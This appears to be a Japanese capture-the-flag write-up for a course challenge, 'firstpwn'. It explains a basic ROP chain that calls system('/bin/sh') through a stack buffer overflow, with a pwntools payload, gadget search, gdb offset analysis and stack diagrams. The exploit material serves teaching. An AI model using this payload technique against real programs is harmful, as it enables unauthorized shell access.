# firstpwn

## / Overview

基本のROPチェーン

pop_rdi_ret → bin_sh → ret → system_plt

## / Writeup

講義でも紹介されていた基本的なROPなので、まずペイロードを紹介した後に動作原理について解説します。目標は `system('/bin/sh')` を呼び出すことです。

### ペイロード
```python
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
system_plt = elf.plt['system']
bin_sh = next(elf.search(b'/bin/sh'))
ret = rop.find_gadget(['ret'])[0]

payload = b'A' * 0x58
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system_plt)
```

returnアドレスの直前までを  `A` で埋めて、`pop_rdi_ret`ガジェット → `/bin/sh`文字列のアドレス → `ret`ガジェット → `system_plt` の順番にスタックに積みます。

使えるガジェットを検索するには

```sh
ROPgadget --binary ./chall
```

これにgrepなど組み合わせて命令片を見つけます。

### 動作原理

このペイロードが積まれた後のスタックと、system関数が第一引数として参照するRDIレジスタの中身についてステップごとに見ていきましょう。

まずは buf が宣言される前です。この図はスタックの内容を可視化しています。1 行が 8 バイトに対応していて、上から下に向かってアドレスの値が増えます。

```
Stack Layout                 Data / Address
 +---------------------------+---------------------------+
 | (Free Space)              | (未確保のメモリ領域)       | <--- RSP (まだ下がっていない)
 +---------------------------+---------------------------+
 | return addr               | 呼び出し元(main等)のアドレス| 
 +---------------------------+---------------------------+
 | (Previous Frame)          | ...                       |
 +---------------------------+---------------------------+
```

ここで`vuln_func`関数が呼ばれると、スタックに「ここが`vuln_funv`の終わりですよ―」を示す`rbp`レジスタが呼ばれて、現在のスタックのトップのアドレスを保持する`rsp`レジスタの値が入ります。また、この番地には`main`関数のアドレスが保管されます。

もう少し処理を進めると、プログラムは `buf` の領域をスタックに確保します。この確保した領域より多い量が書き込まれるとバッファオーバーフローが発生します。

```
Stack Layout                 Data / Address
 +---------------------------+---------------------------+
 | buf [0x00 - 0x07]         | (ゴミデータ)               | <--- RSP (ここから書き込み開始)
 +---------------------------+---------------------------+
 | ... (bufの中身)           | (ゴミデータ)               |
 +---------------------------+---------------------------+
 | buf [0x48 - 0x4f]         | (ゴミデータ)               |
 +---------------------------+---------------------------+
 | saved rbp                 | 元のRBPの値               |
 +---------------------------+---------------------------+
 | return addr               | 呼び出し元(main等)のアドレス|
 +---------------------------+---------------------------+
```

ということでペイロードを挿入したいのですが buf の先頭からreturnアドレスまでの距離がわかりません。実行ファイル `chall` を逆アセンブルして解析しましょう。まずは `gdb ./chall` でデバッグを開始します。続いて以下の手順で `vuln_func` の内容を逆アセンブルします。

```sh
(gdb) b vuln_func # vuln_funvにブレークポイントを張る

Breakpoint 1 at 0x4012ab: file chall.c, line 57.
(gdb) run # ブレークポイントまで実行

Breakpoint 1, vuln_func () at chall.c:57
(gdb) disas # 現在停止している場所の周辺命令を表示
Dump of assembler code for function vuln_func:

   0x00000000004012c0 <+29>:    mov    QWORD PTR [rip+0x2dc9],rax        # 0x404090 <filename>
   0x00000000004012c7 <+36>:    lea    rax,[rbp-0x50]
```

注目すべきはここです。

```
   0x00000000004012df <+60>:    lea    rax,[rbp-0x50]
   0x00000000004012e3 <+64>:    mov    rdi,rax
   0x00000000004012eb <+72>:    call   0x401060 <gets@plt>
```

`rdi`に`rbp-0x50`のアドレスがセットされ、`gets`関数がこの位置から書き込みを開始しています。つまり`rbp`の`0x8`バイトも考慮すると、 buf の先頭からreturnアドレスまでは `0x58` バイトであることが分かります。そのためペイロードの前半は `A` を`0x58`個で埋めることにします。

よってペイロードは次のようにスタックに埋め込まれます。

```
Stack Layout                 Data / Address
 +---------------------------+---------------------------+
 | buf (overflowed)          | 'AAAAAAAA'                | <--- 入力開始地点
 +---------------------------+---------------------------+
 | ...                       | 'AAAAAAAA'                | 
 +---------------------------+---------------------------+
 | saved rbp (overwritten)   | 'AAAAAAAA'                | (RBPもAで埋まる)
 +---------------------------+---------------------------+
 | return addr (overwritten) | pop rdi; ret のアドレス    | (★ここが目標地点)
 +---------------------------+---------------------------+
 | (Next payloads)           | &"/bin/sh"                |
 +---------------------------+---------------------------+
 | (Next payloads)           | ret (alignment)           |
 +---------------------------+---------------------------+
 | (Next payloads)           | system@plt                |
 +---------------------------+---------------------------+
```

ここからは`vuln_func`がreturnアドレスに戻ってきてからの処理を追います。上には`rdi`レジスタの内容も載せています。

returnアドレスに `pop rdi; ret` のアドレスがセットされているのでそこに飛びます。スタックの先頭は 1 行下がります。

```
RDIレジスタ: ?????????????????? (不定)

        Stack Layout                 Data / Address
 +---------------------------+---------------------------+
 | buf (padding)             | "AAAAAAAA"                |
 +---------------------------+---------------------------+
 | ...                       | ...                       |
 +---------------------------+---------------------------+
 | saved rbp                 | "AAAAAAAA"                |
 +---------------------------+---------------------------+
 | return addr               | pop rdi; ret のアドレス    | <--- RSP (ここへジャンプ)
 +---------------------------+---------------------------+
 | params                    | &"/bin/sh"                |
 +---------------------------+---------------------------+
 | alignment                 | ret のアドレス             |
 +---------------------------+---------------------------+
 | target function           | system@plt                |
 +---------------------------+---------------------------+
```

`pop rdi` でスタックの先頭アドレスの文字列を `rdi` レジスタにセットします。スタックの先頭は 1 行下がります。また`ret`で再度スタックの先頭のアドレスを命令として実行しようとします。

```
RDIレジスタ: &"/bin/sh" (格納完了)

        Stack Layout                 Data / Address
 +---------------------------+---------------------------+
 | (executed)                | pop rdi; ret              |
 +---------------------------+---------------------------+
 | params                    | &"/bin/sh"                | <--- RSP (popにより値がRDIへ)
 +---------------------------+---------------------------+
 | alignment                 | ret のアドレス             |
 +---------------------------+---------------------------+
 | target function           | system@plt                |
 +---------------------------+---------------------------+
```


次に`ret`が実行されて一見無駄に見えますが、これは命令が16バイト単位で並んでいないとエラーが起こるかららしいです。
```
RDIレジスタ: &"/bin/sh"

        Stack Layout                 Data / Address
 +---------------------------+---------------------------+
 | (executed)                | &"/bin/sh"                |
 +---------------------------+---------------------------+
 | alignment                 | ret のアドレス             | <--- RSP (ここへジャンプ)
 +---------------------------+---------------------------+
 | target function           | system@plt                |
 +---------------------------+---------------------------+
```

最後に`system@plt`が呼ばれることで`rdi`の`/bin/sh`を読み込んでシェルを起動します。

```
RDIレジスタ: &"/bin/sh" (第1引数として機能)

        Stack Layout                 Data / Address
 +---------------------------+---------------------------+
 | (executed)                | ret (alignment)           |
 +---------------------------+---------------------------+
 | target function           | system@plt                | <--- RSP (ここへジャンプ)
 +---------------------------+---------------------------+
 | (following stack)         | ...                       |
 +---------------------------+---------------------------+

 [!] 実行: system(RDI) => system("/bin/sh")
```
